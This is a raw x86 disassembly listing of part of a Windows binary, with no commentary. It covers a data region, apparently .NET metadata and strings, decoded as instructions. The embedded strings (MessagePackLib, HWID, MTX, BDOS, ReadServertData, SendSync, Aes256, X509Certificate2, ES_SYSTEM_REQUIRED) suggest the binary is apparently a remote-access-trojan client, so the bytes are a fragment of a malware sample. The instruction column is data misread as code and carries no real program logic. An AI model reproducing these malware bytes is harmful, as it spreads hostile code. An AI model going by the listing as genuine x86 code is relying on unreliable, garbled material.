  4075fc:	bf 00 00 00 f0       	mov    $0xf0000000,%edi
  407601:	0c b7                	or     $0xb7,%al
  407603:	00 00                	add    %al,(%eax)
  407605:	00 9c 1a c3 01 00 00 	add    %bl,0x1c3(%edx,%ebx,1)
  40760c:	cd 0f                	int    $0xf
  40760e:	f8                   	clc
  40760f:	01 00                	add    %eax,(%eax)
  407611:	00 90 0d fe 01 00    	add    %dl,0x1fe0d(%eax)
  407617:	00 9e 0c 69 02 00    	add    %bl,0x2690c(%esi)
  40761d:	00 d5                	add    %dl,%ch
  40761f:	13 6d 02             	adc    0x2(%ebp),%ebp
  407622:	00 00                	add    %al,(%eax)
  407624:	00 19                	add    %bl,(%ecx)
  407626:	71 02                	jno    0x40762a
  407628:	00 00                	add    %al,(%eax)
  40762a:	85 1c 75 02 00 00 f8 	test   %ebx,-0x7fffffe(,%esi,2)
  407631:	07                   	pop    %es
  407632:	7a 02                	jp     0x407636
  407634:	02 00                	add    (%eax),%al
  407636:	06                   	push   %es
  407637:	00 03                	add    %al,(%ebx)
  407639:	00 01                	add    %al,(%ecx)
  40763b:	00 07                	add    %al,(%edi)
  40763d:	00 03                	add    %al,(%ebx)
  40763f:	00 02                	add    %al,(%edx)
  407641:	00 08                	add    %cl,(%eax)
  407643:	00 05 00 01 00 09    	add    %al,0x9000100
  407649:	00 05 00 02 00 0a    	add    %al,0xa000200
  40764f:	00 07                	add    %al,(%edi)
  407651:	00 01                	add    %al,(%ecx)
  407653:	00 0b                	add    %cl,(%ebx)
  407655:	00 07                	add    %al,(%edi)
  407657:	00 02                	add    %al,(%edx)
  407659:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40765c:	09 00                	or     %eax,(%eax)
  40765e:	01 00                	add    %eax,(%eax)
  407660:	0d 00 09 00 02       	or     $0x2000900,%eax
  407665:	00 0e                	add    %cl,(%esi)
  407667:	00 0b                	add    %cl,(%ebx)
  407669:	00 01                	add    %al,(%ecx)
  40766b:	00 0f                	add    %cl,(%edi)
  40766d:	00 0b                	add    %cl,(%ebx)
  40766f:	00 02                	add    %al,(%edx)
  407671:	00 10                	add    %dl,(%eax)
  407673:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407679:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40767f:	00 0f                	add    %cl,(%edi)
  407681:	00 01                	add    %al,(%ecx)
  407683:	00 13                	add    %dl,(%ebx)
  407685:	00 0f                	add    %cl,(%edi)
  407687:	00 02                	add    %al,(%edx)
  407689:	00 14 00             	add    %dl,(%eax,%eax,1)
  40768c:	11 00                	adc    %eax,(%eax)
  40768e:	02 00                	add    (%eax),%al
  407690:	15 00 13 00 01       	adc    $0x1001300,%eax
  407695:	00 16                	add    %dl,(%esi)
  407697:	00 13                	add    %dl,(%ebx)
  407699:	00 02                	add    %al,(%edx)
  40769b:	00 17                	add    %dl,(%edi)
  40769d:	00 15 00 01 00 18    	add    %dl,0x18000100
  4076a3:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a9:	00 17                	add    %dl,(%edi)
  4076ab:	00 01                	add    %al,(%ecx)
  4076ad:	00 1a                	add    %bl,(%edx)
  4076af:	00 17                	add    %dl,(%edi)
  4076b1:	00 02                	add    %al,(%edx)
  4076b3:	00 60 00             	add    %ah,0x0(%eax)
  4076b6:	19 00                	sbb    %eax,(%eax)
  4076b8:	02 00                	add    (%eax),%al
  4076ba:	68 00 1b 00 02       	push   $0x2001b00
  4076bf:	00 69 00             	add    %ch,0x0(%ecx)
  4076c2:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076c7:	00 1f                	add    %bl,(%edi)
  4076c9:	00 01                	add    %al,(%ecx)
  4076cb:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076d2:	8d 00                	lea    (%eax),%eax
  4076d4:	21 00                	and    %eax,(%eax)
  4076d6:	01 00                	add    %eax,(%eax)
  4076d8:	8e 00                	mov    (%eax),%es
  4076da:	21 00                	and    %eax,(%eax)
  4076dc:	02 00                	add    (%eax),%al
  4076de:	8f 00                	pop    (%eax)
  4076e0:	23 00                	and    (%eax),%eax
  4076e2:	01 00                	add    %eax,(%eax)
  4076e4:	90                   	nop
  4076e5:	00 23                	add    %ah,(%ebx)
  4076e7:	00 02                	add    %al,(%edx)
  4076e9:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076ef:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076f5:	00 c0                	add    %al,%al
  4076f7:	00 03                	add    %al,(%ebx)
  4076f9:	00 16                	add    %dl,(%esi)
  4076fb:	00 c2                	add    %al,%dl
  4076fd:	00 05 00 16 00 c4    	add    %al,0xc4001600
  407703:	00 07                	add    %al,(%edi)
  407705:	00 18                	add    %bl,(%eax)
  407707:	00 26                	add    %ah,(%esi)
  407709:	01 09                	add    %ecx,(%ecx)
  40770b:	00 1a                	add    %bl,(%edx)
  40770d:	0f 0d 0f             	prefetchw (%edi)
  407710:	25 0f ef 05 5b       	and    $0x5b05ef0f,%eax
  407715:	06                   	push   %es
  407716:	75 06                	jne    0x40771e
  407718:	9c                   	pushf
  407719:	06                   	push   %es
  40771a:	ff 06                	incl   (%esi)
  40771c:	27                   	daa
  40771d:	07                   	pop    %es
  40771e:	00 01                	add    %al,(%ecx)
  407720:	71 00                	jno    0x407722
  407722:	fc                   	cld
  407723:	1b 01                	sbb    (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 73 00             	add    %esi,0x0(%ebx)
  40772a:	e3 1b                	jecxz  0x407747
  40772c:	01 00                	add    %eax,(%eax)
  40772e:	00 01                	add    %al,(%ecx)
  407730:	75 00                	jne    0x407732
  407732:	e6 05                	out    %al,$0x5
  407734:	02 00                	add    (%eax),%al
  407736:	41                   	inc    %ecx
  407737:	01 77 00             	add    %esi,0x0(%edi)
  40773a:	f9                   	stc
  40773b:	1a 02                	sbb    (%edx),%al
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	79 00                	jns    0x407742
  407742:	ba 08 02 00 40       	mov    $0x40000208,%edx
  407747:	01 7b 00             	add    %edi,0x0(%ebx)
  40774a:	76 0e                	jbe    0x40775a
  40774c:	03 00                	add    (%eax),%eax
  40774e:	50                   	push   %eax
  40774f:	20 00                	and    %al,(%eax)
  407751:	00 2d 00 70 20 00    	add    %ch,0x207000
  407757:	00 47 00             	add    %al,0x0(%edi)
  40775a:	04 80                	add    $0x80,%al
  40775c:	00 00                	add    %al,(%eax)
  40775e:	01 00                	add    %eax,(%eax)
	...
  40776c:	f6 1b                	negb   (%ebx)
  40776e:	00 00                	add    %al,(%eax)
  407770:	04 00                	add    $0x0,%al
	...
  40777a:	00 00                	add    %al,(%eax)
  40777c:	01 00                	add    %eax,(%eax)
  40777e:	b8 02 00 00 00       	mov    $0x2,%eax
  407783:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40778e:	00 00                	add    %al,(%eax)
  407790:	01 00                	add    %eax,(%eax)
  407792:	e6 0f                	out    %al,$0xf
  407794:	00 00                	add    %al,(%eax)
  407796:	00 00                	add    %al,(%eax)
  407798:	04 00                	add    $0x0,%al
	...
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	cc                   	int3
  4077a5:	00 cc                	add    %cl,%ah
  4077a7:	0c 00                	or     $0x0,%al
  4077a9:	00 00                	add    %al,(%eax)
  4077ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	00 00                	add    %al,(%eax)
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	70 00                	jo     0x4077b6
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	01 00                	add    %eax,(%eax)
  4077ba:	42                   	inc    %edx
  4077bb:	08 00                	or     %al,(%eax)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 0a                	add    %cl,(%edx)
	...
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 cc                	add    %cl,%ah
  4077cd:	00 dc                	add    %bl,%ah
  4077cf:	02 00                	add    (%eax),%al
  4077d1:	00 00                	add    %al,(%eax)
  4077d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	cc                   	int3
  4077e1:	00 77 1a             	add    %dh,0x1a(%edi)
  4077e4:	00 00                	add    %al,(%eax)
  4077e6:	00 00                	add    %al,(%eax)
  4077e8:	04 00                	add    $0x0,%al
	...
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	9e                   	sahf
  4077f7:	17                   	pop    %ss
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	04 00                	add    $0x0,%al
  4077fe:	00 00                	add    %al,(%eax)
  407800:	00 00                	add    %al,(%eax)
  407802:	00 00                	add    %al,(%eax)
  407804:	70 00                	jo     0x407806
  407806:	00 00                	add    %al,(%eax)
  407808:	cc                   	int3
  407809:	00 8d 12 00 00 00    	add    %cl,0x12(%ebp)
  40780f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407812:	0b 00                	or     (%eax),%eax
  407814:	10 00                	adc    %al,(%eax)
  407816:	0f 00 14 00          	lldt   (%eax,%eax,1)
  40781a:	13 00                	adc    (%eax),%eax
  40781c:	1e                   	push   %ds
  40781d:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  407823:	06                   	push   %es
  407824:	00 41 63             	add    %al,0x63(%ecx)
  407827:	74 69                	je     0x407892
  407829:	6f                   	outsl  %ds:(%esi),(%dx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	60                   	pusha
  40782c:	31 30                	xor    %esi,(%eax)
  40782e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407831:	70 5f                	jo     0x407892
  407833:	5f                   	pop    %edi
  407834:	30 00                	xor    %al,(%eax)
  407836:	49                   	dec    %ecx
  407837:	45                   	inc    %ebp
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	75 6d                	jne    0x4078a8
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407842:	31 00                	xor    %eax,(%eax)
  407844:	43                   	inc    %ebx
  407845:	61                   	popa
  407846:	6c                   	insb   (%dx),%es:(%edi)
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	53                   	push   %ebx
  407849:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407850:	69 
  407851:	73 74                	jae    0x4078c7
  407853:	60                   	pusha
  407854:	31 00                	xor    %eax,(%eax)
  407856:	61                   	popa
  407857:	31 00                	xor    %eax,(%eax)
  407859:	76 31                	jbe    0x40788c
  40785b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785e:	53                   	push   %ebx
  40785f:	74 61                	je     0x4078c2
  407861:	74 69                	je     0x4078cc
  407863:	63 41 72             	arpl   %eax,0x72(%ecx)
  407866:	72 61                	jb     0x4078c9
  407868:	79 49                	jns    0x4078b3
  40786a:	6e                   	outsb  %ds:(%esi),(%dx)
  40786b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407872:	69 
  407873:	7a 65                	jp     0x4078da
  407875:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407881:	74 2e                	je     0x4078b1
  407883:	57                   	push   %edi
  407884:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788b:	55                   	push   %ebp
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	49                   	dec    %ecx
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	74 33                	je     0x4078cb
  407898:	32 00                	xor    (%eax),%al
  40789a:	53                   	push   %ebx
  40789b:	77 61                	ja     0x4078fe
  40789d:	70 49                	jo     0x4078e8
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	74 33                	je     0x4078d5
  4078a2:	32 00                	xor    (%eax),%al
  4078a4:	3c 3e                	cmp    $0x3e,%al
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	5f                   	pop    %edi
  4078a8:	5f                   	pop    %edi
  4078a9:	32 00                	xor    (%eax),%al
  4078ab:	61                   	popa
  4078ac:	32 00                	xor    (%eax),%al
  4078ae:	58                   	pop    %eax
  4078af:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b4:	72 74                	jb     0x40792a
  4078b6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078bd:	32 00                	xor    (%eax),%al
  4078bf:	76 32                	jbe    0x4078f3
  4078c1:	00 76 33             	add    %dh,0x33(%esi)
  4078c4:	00 57 72             	add    %dl,0x72(%edi)
  4078c7:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078ce:	36 
  4078cf:	34 00                	xor    $0x0,%al
  4078d1:	54                   	push   %esp
  4078d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d3:	55                   	push   %ebp
  4078d4:	49                   	dec    %ecx
  4078d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d6:	74 36                	je     0x40790e
  4078d8:	34 00                	xor    $0x0,%al
  4078da:	47                   	inc    %edi
  4078db:	65 74 41             	gs je  0x40791f
  4078de:	73 55                	jae    0x407935
  4078e0:	49                   	dec    %ecx
  4078e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e2:	74 36                	je     0x40791a
  4078e4:	34 00                	xor    $0x0,%al
  4078e6:	53                   	push   %ebx
  4078e7:	65 74 41             	gs je  0x40792b
  4078ea:	73 55                	jae    0x407941
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	54                   	push   %esp
  4078f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f4:	49                   	dec    %ecx
  4078f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f6:	74 36                	je     0x40792e
  4078f8:	34 00                	xor    $0x0,%al
  4078fa:	53                   	push   %ebx
  4078fb:	77 61                	ja     0x40795e
  4078fd:	70 49                	jo     0x407948
  4078ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407900:	74 36                	je     0x407938
  407902:	34 00                	xor    $0x0,%al
  407904:	54                   	push   %esp
  407905:	6f                   	outsl  %ds:(%esi),(%dx)
  407906:	55                   	push   %ebp
  407907:	49                   	dec    %ecx
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	74 31                	je     0x407944
  407913:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407917:	61                   	popa
  407918:	70 49                	jo     0x407963
  40791a:	6e                   	outsb  %ds:(%esi),(%dx)
  40791b:	74 31                	je     0x40794e
  40791d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407921:	41                   	inc    %ecx
  407922:	43                   	inc    %ebx
  407923:	53                   	push   %ebx
  407924:	48                   	dec    %eax
  407925:	41                   	inc    %ecx
  407926:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40792c:	61                   	popa
  40792d:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407933:	73 32                	jae    0x407967
  407935:	35 36 00 61 65       	xor    $0x65610036,%eax
  40793a:	73 32                	jae    0x40796e
  40793c:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407941:	53                   	push   %ebx
  407942:	74 61                	je     0x4079a5
  407944:	74 69                	je     0x4079af
  407946:	63 41 72             	arpl   %eax,0x72(%ecx)
  407949:	72 61                	jb     0x4079ac
  40794b:	79 49                	jns    0x407996
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407955:	69 
  407956:	7a 65                	jp     0x4079bd
  407958:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40795d:	74 5f                	je     0x4079be
  40795f:	55                   	push   %ebp
  407960:	54                   	push   %esp
  407961:	46                   	inc    %esi
  407962:	38 00                	cmp    %al,(%eax)
  407964:	3c 4d                	cmp    $0x4d,%al
  407966:	6f                   	outsl  %ds:(%esi),(%dx)
  407967:	64 75 6c             	fs jne 0x4079d6
  40796a:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  40796f:	73 73                	jae    0x4079e4
  407971:	61                   	popa
  407972:	67 65 50             	addr16 gs push %eax
  407975:	61                   	popa
  407976:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407979:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407980:	76 61                	jbe    0x4079e3
  407982:	74 65                	je     0x4079e9
  407984:	49                   	dec    %ecx
  407985:	6d                   	insl   (%dx),%es:(%edi)
  407986:	70 6c                	jo     0x4079f4
  407988:	65 6d                	gs insl (%dx),%es:(%edi)
  40798a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798c:	74 61                	je     0x4079ef
  40798e:	74 69                	je     0x4079f9
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	6e                   	outsb  %ds:(%esi),(%dx)
  407992:	44                   	inc    %esp
  407993:	65 74 61             	gs je  0x4079f7
  407996:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799d:	42 
  40799e:	32 41 31             	xor    0x31(%ecx),%al
  4079a1:	46                   	inc    %esi
  4079a2:	39 39                	cmp    %edi,(%ecx)
  4079a4:	30 32                	xor    %dh,(%edx)
  4079a6:	42                   	inc    %edx
  4079a7:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ad:	38 30                	cmp    %dh,(%eax)
  4079af:	45                   	inc    %ebp
  4079b0:	46                   	inc    %esi
  4079b1:	31 36                	xor    %esi,(%esi)
  4079b3:	39 32                	cmp    %esi,(%edx)
  4079b5:	43                   	inc    %ebx
  4079b6:	45                   	inc    %ebp
  4079b7:	39 39                	cmp    %edi,(%ecx)
  4079b9:	34 37                	xor    $0x37,%al
  4079bb:	41                   	inc    %ecx
  4079bc:	31 39                	xor    %edi,(%ecx)
  4079be:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c2:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c5:	44                   	inc    %esp
  4079c6:	38 46 35             	cmp    %al,0x35(%esi)
  4079c9:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079cd:	41                   	inc    %ecx
  4079ce:	37                   	aaa
  4079cf:	32 31                	xor    (%ecx),%dh
  4079d1:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d7:	43                   	inc    %ebx
  4079d8:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079dd:	43                   	inc    %ebx
  4079de:	00 45 53             	add    %al,0x53(%ebp)
  4079e1:	5f                   	pop    %edi
  4079e2:	53                   	push   %ebx
  4079e3:	59                   	pop    %ecx
  4079e4:	53                   	push   %ebx
  4079e5:	54                   	push   %esp
  4079e6:	45                   	inc    %ebp
  4079e7:	4d                   	dec    %ebp
  4079e8:	5f                   	pop    %edi
  4079e9:	52                   	push   %edx
  4079ea:	45                   	inc    %ebp
  4079eb:	51                   	push   %ecx
  4079ec:	55                   	push   %ebp
  4079ed:	49                   	dec    %ecx
  4079ee:	52                   	push   %edx
  4079ef:	45                   	inc    %ebp
  4079f0:	44                   	inc    %esp
  4079f1:	00 45 53             	add    %al,0x53(%ebp)
  4079f4:	5f                   	pop    %edi
  4079f5:	44                   	inc    %esp
  4079f6:	49                   	dec    %ecx
  4079f7:	53                   	push   %ebx
  4079f8:	50                   	push   %eax
  4079f9:	4c                   	dec    %esp
  4079fa:	41                   	inc    %ecx
  4079fb:	59                   	pop    %ecx
  4079fc:	5f                   	pop    %edi
  4079fd:	52                   	push   %edx
  4079fe:	45                   	inc    %ebp
  4079ff:	51                   	push   %ecx
  407a00:	55                   	push   %ebp
  407a01:	49                   	dec    %ecx
  407a02:	52                   	push   %edx
  407a03:	45                   	inc    %ebp
  407a04:	44                   	inc    %esp
  407a05:	00 4d 61             	add    %cl,0x61(%ebp)
  407a08:	70 4e                	jo     0x407a58
  407a0a:	61                   	popa
  407a0b:	6d                   	insl   (%dx),%es:(%edi)
  407a0c:	65 54                	gs push %esp
  407a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0f:	4f                   	dec    %edi
  407a10:	49                   	dec    %ecx
  407a11:	44                   	inc    %esp
  407a12:	00 48 57             	add    %cl,0x57(%eax)
  407a15:	49                   	dec    %ecx
  407a16:	44                   	inc    %esp
  407a17:	00 67 65             	add    %ah,0x65(%edi)
  407a1a:	74 5f                	je     0x407a7b
  407a1c:	46                   	inc    %esi
  407a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1e:	72 6d                	jb     0x407a8d
  407a20:	61                   	popa
  407a21:	74 49                	je     0x407a6c
  407a23:	44                   	inc    %esp
  407a24:	00 45 58             	add    %al,0x58(%ebp)
  407a27:	45                   	inc    %ebp
  407a28:	43                   	inc    %ebx
  407a29:	55                   	push   %ebp
  407a2a:	54                   	push   %esp
  407a2b:	49                   	dec    %ecx
  407a2c:	4f                   	dec    %edi
  407a2d:	4e                   	dec    %esi
  407a2e:	5f                   	pop    %edi
  407a2f:	53                   	push   %ebx
  407a30:	54                   	push   %esp
  407a31:	41                   	inc    %ecx
  407a32:	54                   	push   %esp
  407a33:	45                   	inc    %ebp
  407a34:	00 38                	add    %bh,(%eax)
  407a36:	37                   	aaa
  407a37:	36 33 39             	xor    %ss:(%ecx),%edi
  407a3a:	31 32                	xor    %esi,(%edx)
  407a3c:	36 45                	ss inc %ebp
  407a3e:	41                   	inc    %ecx
  407a3f:	37                   	aaa
  407a40:	37                   	aaa
  407a41:	42                   	inc    %edx
  407a42:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a48:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a4d:	37                   	aaa
  407a4e:	44                   	inc    %esp
  407a4f:	42                   	inc    %edx
  407a50:	41                   	inc    %ecx
  407a51:	36 37                	ss aaa
  407a53:	43                   	inc    %ebx
  407a54:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a59:	46                   	inc    %esi
  407a5a:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a5f:	39 38                	cmp    %edi,(%eax)
  407a61:	38 38                	cmp    %bh,(%eax)
  407a63:	45                   	inc    %ebp
  407a64:	44                   	inc    %esp
  407a65:	30 37                	xor    %dh,(%edi)
  407a67:	30 43 44             	xor    %al,0x44(%ebx)
  407a6a:	34 30                	xor    $0x30,%al
  407a6c:	45                   	inc    %ebp
  407a6d:	31 46 36             	xor    %eax,0x36(%esi)
  407a70:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a76:	67 65 74 5f          	addr16 gs je 0x407ad9
  407a7a:	41                   	inc    %ecx
  407a7b:	53                   	push   %ebx
  407a7c:	43                   	inc    %ebx
  407a7d:	49                   	dec    %ecx
  407a7e:	49                   	dec    %ecx
  407a7f:	00 53 79             	add    %dl,0x79(%ebx)
  407a82:	73 74                	jae    0x407af8
  407a84:	65 6d                	gs insl (%dx),%es:(%edi)
  407a86:	2e 49                	cs dec %ecx
  407a88:	4f                   	dec    %edi
  407a89:	00 49 73             	add    %cl,0x73(%ecx)
  407a8c:	58                   	pop    %eax
  407a8d:	50                   	push   %eax
  407a8e:	00 42 44             	add    %al,0x44(%edx)
  407a91:	4f                   	dec    %edi
  407a92:	53                   	push   %ebx
  407a93:	00 45 53             	add    %al,0x53(%ebp)
  407a96:	5f                   	pop    %edi
  407a97:	43                   	inc    %ebx
  407a98:	4f                   	dec    %edi
  407a99:	4e                   	dec    %esi
  407a9a:	54                   	push   %esp
  407a9b:	49                   	dec    %ecx
  407a9c:	4e                   	dec    %esi
  407a9d:	55                   	push   %ebp
  407a9e:	4f                   	dec    %edi
  407a9f:	55                   	push   %ebp
  407aa0:	53                   	push   %ebx
  407aa1:	00 67 65             	add    %ah,0x65(%edi)
  407aa4:	74 5f                	je     0x407b05
  407aa6:	49                   	dec    %ecx
  407aa7:	56                   	push   %esi
  407aa8:	00 73 65             	add    %dh,0x65(%ebx)
  407aab:	74 5f                	je     0x407b0c
  407aad:	49                   	dec    %ecx
  407aae:	56                   	push   %esi
  407aaf:	00 47 65             	add    %al,0x65(%edi)
  407ab2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab3:	65 72 61             	gs jb  0x407b17
  407ab6:	74 65                	je     0x407b1d
  407ab8:	49                   	dec    %ecx
  407ab9:	56                   	push   %esi
  407aba:	00 4d 54             	add    %cl,0x54(%ebp)
  407abd:	58                   	pop    %eax
  407abe:	00 76 61             	add    %dh,0x61(%esi)
  407ac1:	6c                   	insb   (%dx),%es:(%edi)
  407ac2:	75 65                	jne    0x407b29
  407ac4:	5f                   	pop    %edi
  407ac5:	5f                   	pop    %edi
  407ac6:	00 52 65             	add    %dl,0x65(%edx)
  407ac9:	61                   	popa
  407aca:	64 53                	fs push %ebx
  407acc:	65 72 76             	gs jb  0x407b45
  407acf:	65 72 74             	gs jb  0x407b46
  407ad2:	44                   	inc    %esp
  407ad3:	61                   	popa
  407ad4:	74 61                	je     0x407b37
  407ad6:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ada:	61                   	popa
  407adb:	00 6d 73             	add    %ch,0x73(%ebp)
  407ade:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae1:	6c                   	insb   (%dx),%es:(%edi)
  407ae2:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407ae9:	65 6d                	gs insl (%dx),%es:(%edi)
  407aeb:	2e 43                	cs inc %ebx
  407aed:	6f                   	outsl  %ds:(%esi),(%dx)
  407aee:	6c                   	insb   (%dx),%es:(%edi)
  407aef:	6c                   	insb   (%dx),%es:(%edi)
  407af0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af5:	6e                   	outsb  %ds:(%esi),(%dx)
  407af6:	73 2e                	jae    0x407b26
  407af8:	47                   	inc    %edi
  407af9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afb:	65 72 69             	gs jb  0x407b67
  407afe:	63 00                	arpl   %eax,(%eax)
  407b00:	4d                   	dec    %ebp
  407b01:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b08:	74 2e                	je     0x407b38
  407b0a:	56                   	push   %esi
  407b0b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b12:	73 69                	jae    0x407b7d
  407b14:	63 00                	arpl   %eax,(%eax)
  407b16:	67 65 74 5f          	addr16 gs je 0x407b79
  407b1a:	53                   	push   %ebx
  407b1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1d:	64 53                	fs push %ebx
  407b1f:	79 6e                	jns    0x407b8f
  407b21:	63 00                	arpl   %eax,(%eax)
  407b23:	45                   	inc    %ebp
  407b24:	6e                   	outsb  %ds:(%esi),(%dx)
  407b25:	64 52                	fs push %edx
  407b27:	65 61                	gs popa
  407b29:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2d:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b34:	00 
  407b35:	54                   	push   %esp
  407b36:	68 72 65 61 64       	push   $0x64616572
  407b3b:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b3f:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b43:	6e                   	outsb  %ds:(%esi),(%dx)
  407b44:	65 72 41             	gs jb  0x407b88
  407b47:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4c:	41                   	inc    %ecx
  407b4d:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b53:	61                   	popa
  407b54:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5a:	74 5f                	je     0x407bbb
  407b5c:	43                   	inc    %ebx
  407b5d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b5e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b5f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b60:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b65:	00 67 65             	add    %ah,0x65(%edi)
  407b68:	74 5f                	je     0x407bc9
  407b6a:	49                   	dec    %ecx
  407b6b:	73 43                	jae    0x407bb0
  407b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b70:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b75:	00 73 65             	add    %dh,0x65(%ebx)
  407b78:	74 5f                	je     0x407bd9
  407b7a:	49                   	dec    %ecx
  407b7b:	73 43                	jae    0x407bc0
  407b7d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407b80:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
